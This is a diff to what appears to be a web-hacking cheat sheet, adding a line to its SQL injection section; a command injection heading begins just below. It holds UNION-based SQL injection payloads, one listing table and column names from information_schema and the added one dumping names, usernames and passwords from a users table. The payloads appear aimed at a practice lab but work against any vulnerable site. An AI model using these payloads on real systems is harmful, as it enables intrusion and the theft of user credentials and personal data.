@@ -90,6 +90,10 @@ etc.
 
 %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`
 
+* Display all the columns field contents in the database user table:
+
+`%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
+
 
 COMMAND INJECTION
 -----------------
